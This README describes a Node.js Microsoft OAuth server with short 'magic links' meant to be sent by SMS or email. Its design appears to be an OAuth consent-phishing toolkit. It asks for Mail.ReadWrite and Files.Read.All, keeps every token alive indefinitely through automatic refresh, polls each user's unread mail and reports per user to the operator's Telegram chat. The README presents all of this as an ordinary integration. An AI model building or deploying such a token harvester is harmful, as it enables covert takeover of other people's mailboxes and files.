# Microsoft OAuth 2.0 Server

A production-ready OAuth 2.0 server for Microsoft Graph API with automatic token refresh, polling, and Telegram notifications.

## Features

- ✅ Complete OAuth 2.0 flow for Microsoft authentication
- 🔄 Automatic token refresh with cron job
- 📊 Polling system for notifications (emails, files, etc.)
- 📱 Telegram bot integration for real-time alerts
- 💾 **SQLite database for multi-user token storage**
- 🚀 Ready for Render deployment
- 🔗 Magic link system for simplified user authorization

## Setup Instructions

### 1. Microsoft App Registration

1. Go to [Azure Portal](https://portal.azure.com) → Azure Active Directory → App registrations
2. Your Client ID: `1ba7c2c8-b4ae-4550-a747-e69d8737e2bb`
3. Create a **Client Secret** (save it securely)
4. Add Redirect URI: `https://your-app.onrender.com/auth/callback`
5. Grant Admin Consent for all required permissions

### 2. Telegram Bot Setup

1. Message [@BotFather](https://t.me/botfather) on Telegram
2. Send `/newbot` and follow instructions to create a bot
3. Save the **Bot Token**
4. Get your Chat ID:
   - Message [@userinfobot](https://t.me/userinfobot)
   - Or message your bot and visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`

### 3. Environment Configuration

1. Copy `.env.example` to `.env`:
   ```bash
   cp .env.example .env
   ```

2. Fill in your credentials in `.env`:
   ```env
   CLIENT_ID=1ba7c2c8-b4ae-4550-a747-e69d8737e2bb
   CLIENT_SECRET=your_client_secret_from_azure
   TENANT_ID=common
   REDIRECT_URI=https://your-app.onrender.com/auth/callback
   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
   TELEGRAM_CHAT_ID=your_telegram_chat_id
   ```

### 4. Local Development

```bash
# Install dependencies
npm install

# Run development server
npm run dev

# Or run production server
npm start
```

Visit `http://localhost:3000/auth/login` to start OAuth flow.

### 5. Deploy to Render

1. Push code to GitHub
2. Create new Web Service on [Render](https://render.com)
3. Connect your repository
4. Configure:
   - **Build Command**: `npm install`
   - **Start Command**: `npm start`
5. Add environment variables in Render dashboard (from your `.env`)
6. Update `REDIRECT_URI` in both `.env` and Azure to match Render URL
7. Deploy!

## API Endpoints

### Authentication

- `GET /auth/login` - Manual OAuth flow (for testing)
- `POST /auth/magic-link` - Generate magic auth link (body: `{userId, userEmail, metadata, shortLink: true}`)
- `GET /auth/link/:userId?email=xxx` - **Simple magic link (auto-generates short link)**
- `GET /auth/quick/:msftUserId` - **Quick auth for Microsoft user ID (SMS-optimized)**
- `GET /s/:shortCode` - **Short link redirect**
- `GET /auth/authorize/:userId` - Auto-authorize endpoint (the link users click)
- `GET /auth/callback` - OAuth callback (handled automatically)
- `GET /auth/token?userId=xxx` - Get token info for specific user (or all users if no userId)
- `POST /auth/refresh` - Manually refresh token (body: `{"userId": "xxx"}`)
- `DELETE /auth/token/:userId` - Delete token for a user
- `GET /auth/stats` - Get database statistics and expiring tokens
- `GET /auth/cron-status` - Get automatic token refresh status

### Polling

- `POST /polling/start` - Start polling for notifications
  ```json
  { "intervalMinutes": 5 }
  ```
- `POST /polling/stop` - Stop polling

### Monitoring

- `GET /` - API documentation
- `GET /health` - Health check with token status

## How It Works

### Magic Link Flow (Simplified UX) 🚀

1. **Backend generates link**: Call `POST /auth/magic-link` with user info
2. **Send link to user**: Email, SMS, in-app notification, etc.
3. **User clicks link**: Opens `/auth/authorize/:userId`
4. **Auto-redirect to Microsoft**: If already logged in to Microsoft, they just see a consent screen
5. **Instant authorization**: User clicks "Accept" once
6. **Token saved**: Server gets token automatically, stores it, sends Telegram notification
7. **Success page shown**: User sees confirmation and can close the tab

**Key benefit**: Users never copy/paste tokens or deal with complex flows!

### Traditional OAuth Flow
1. User visits `/auth/login`
2. Redirects to Microsoft login
3. User authenticates and grants permissions
4. Microsoft redirects to `/auth/callback` with code
5. Server exchanges code for access + refresh tokens
6. Tokens saved to `token.json`
7. Telegram notification sent

### Token Refresh
- **Automatic**: Cron job runs **every 30 minutes**
- **Proactive refresh**: Refreshes tokens 30 minutes before expiry
- **Keeps tokens alive**: Ensures tokens never expire (unless revoked)
- Checks all tokens expiring within 30 minutes
- Refreshes using refresh token per user
- Updates stored tokens in database
- Sends Telegram notification per user
- Cleans up expired tokens
- Tracks refresh history and errors

### Polling
- Configurable interval (default: 5 minutes)
- **Polls for all users with valid tokens**
- Checks for unread emails (customizable)
- Sends notifications via Telegram with user identification
- Auto-refreshes tokens if needed per user

## Customizing Polling

Edit the `pollForNotifications()` function in `server.js` to poll different endpoints:

```javascript
// Example: Get recent files
const response = await axios.get(
  'https://graph.microsoft.com/v1.0/me/drive/recent',
  { headers: { 'Authorization': `Bearer ${token.access_token}` } }
);
```

## Magic Link Usage Examples

See [example-usage.js](example-usage.js) for complete examples. Quick start:

### For SMS: Use Microsoft User ID Directly

```bash
# Shortest possible link - perfect for SMS!
# Just use their Microsoft user ID (from their profile)
GET https://your-app.com/auth/quick/abc123-def456-ghi789

# Automatically creates short link like: https://your-app.com/s/Xa9pQm
# User gets redirected → Microsoft auth → token saved with their MSFT ID
```

### Simple GET Endpoint

```bash
# Generate link (auto-creates short link)
GET https://your-app.com/auth/link/user123?email=user@example.com

# Short link is generated automatically (6 chars)
# Returns: https://your-app.com/s/aB3xYz
```

### Get JSON Response

```bash
GET https://your-app.com/auth/link/user123?returnJson=true

# Returns:
{
  "success": true,
  "link": "https://your-app.com/s/aB3xYz",        # Short link
  "magicLink": "https://your-app.com/auth/authorize/...",  # Full link
  "shortCode": "aB3xYz",
  "userId": "user123",
  "expiresIn": 600
}
```

### POST Endpoint (More Control)

```javascript
const response = await axios.post('http://localhost:3000/auth/magic-link', {
  userId: 'user123',  // Or use their Microsoft user ID
  userEmail: 'user@example.com',
  shortLink: true,    // Default: true
  metadata: { plan: 'premium' }
});

const { link, shortCode } = response.data;
// link = "https://your-app.com/s/aB3xYz" (short version)
// Send via SMS!
```

### Integration Examples

**1. Send via SMS (Recommended)**
```javascript
// Use their Microsoft user ID directly
const msftUserId = 'abc123-def456-ghi789'; // From their MSFT profile
const link = `https://your-app.com/auth/quick/${msftUserId}`;

await sendSMS(phoneNumber, `Connect your Microsoft account: ${link}`);
// Link is automatically shortened to: https://your-app.com/s/Xa9pQm
```

**2. Send via Email**
```javascript
const response = await axios.get(`https://your-app.com/auth/link/user123?returnJson=true`);
const { link } = response.data;

await sendEmail({
  to: 'user@example.com',
  subject: 'Connect Your Microsoft Account',
  body: `Click here to authorize: ${link}`
});
```

**3. In-App Notification**
```javascript
const link = `https://your-app.com/auth/link/${userId}`;
await showNotification(userId, {
  title: 'Connect Microsoft',
  action: link  // Short link auto-generated
});
```

**4. Get User ID from Microsoft Token**
```javascript
// After user authorizes, you can get their Microsoft user ID
const token = tokenStorage.getToken(userId);

// Or call Microsoft Graph to get their ID
const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
  headers: { Authorization: `Bearer ${token.access_token}` }
});
console.log(userInfo.data.id); // This is their Microsoft user ID
// Use this ID for future auth links!
```

## Available Microsoft Graph Scopes

Your app has these permissions:
- `User.Read` - Read user profile
- `Mail.ReadWrite` - Read and write mail
- `Files.Read` - Read user files
- `Files.Read.All` - Read all accessible files
- `Notes.Read` - Read OneNote notebooks
- `Device.Read` - Read user devices
- `email`, `openid`, `profile` - Basic authentication
- `offline_access` - Get refresh token

## Security Notes

- ⚠️ Never commit `.env` or `token.json` to git
- 🔒 Keep Client Secret secure
- 🔐 Use HTTPS in production (Render provides this)
- 👥 Grant only necessary permissions

## Troubleshooting

### "No token found" error
- Visit `/auth/login` to authenticate

### Token refresh fails
- Check Client Secret is correct
- Ensure `offline_access` scope is included
- Re-authenticate if needed

### Telegram not working
- Verify bot token and chat ID
- Make sure you've messaged the bot first
- Check bot token format (should be like `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

## File Structure

```
├── server.js              # Main Express server
├── tokenStorage.js        # SQLite database for token persistence
├── telegramNotifier.js    # Telegram integration
├── example-usage.js       # Magic link usage examples
├── package.json           # Dependencies
├── .env                   # Environment variables (create from .env.example)
├── .env.example           # Environment template
└── tokens.db             # SQLite database (auto-generated)
```

## Database Schema

The SQLite database stores tokens and short links with the following structure:

### Tokens Table
```sql
CREATE TABLE tokens (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT UNIQUE NOT NULL,      -- Your user identifier (can be MSFT ID)
  user_email TEXT,                    -- User's email (optional)
  access_token TEXT NOT NULL,         -- Microsoft access token
  refresh_token TEXT NOT NULL,        -- Microsoft refresh token
  token_type TEXT,                    -- Usually "Bearer"
  expires_at INTEGER NOT NULL,        -- Unix timestamp
  scope TEXT,                         -- Granted scopes
  metadata TEXT,                      -- JSON metadata
  created_at INTEGER NOT NULL,        -- Creation timestamp
  updated_at INTEGER NOT NULL         -- Last update timestamp
);
```

### Short Links Table
```sql
CREATE TABLE short_links (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  short_code TEXT UNIQUE NOT NULL,   -- 6-character code (e.g., "aB3xYz")
  target_url TEXT NOT NULL,          -- Full magic link URL
  user_id TEXT,                      -- Associated user (optional)
  clicks INTEGER DEFAULT 0,          -- Click tracking
  created_at INTEGER NOT NULL,       -- Creation timestamp
  expires_at INTEGER NOT NULL        -- Expiration (10 minutes)
);
```

### Database Benefits
- 🗂️ **Multi-user support** - Store tokens for multiple users
- 🔍 **Fast lookups** - Indexed by user_id and expires_at
- 📊 **Easy queries** - Get expiring tokens, stats, etc.
- 💪 **Reliable** - ACID compliant with WAL mode
- 📦 **Lightweight** - No external database server needed
- 💾 **Persistent** - Survives server restarts, deployments
- 🔄 **Auto-refresh** - Cron keeps all tokens alive indefinitely
- 🔗 **Short links** - Built-in URL shortener with click tracking
- 📱 **SMS-optimized** - Tiny links perfect for text messages

## License

ISC

## Support

For issues with:
- Microsoft OAuth: [Microsoft Identity Platform Docs](https://docs.microsoft.com/en-us/azure/active-directory/develop/)
- Graph API: [Microsoft Graph Docs](https://docs.microsoft.com/en-us/graph/)
- Telegram Bots: [Telegram Bot API](https://core.telegram.org/bots/api)
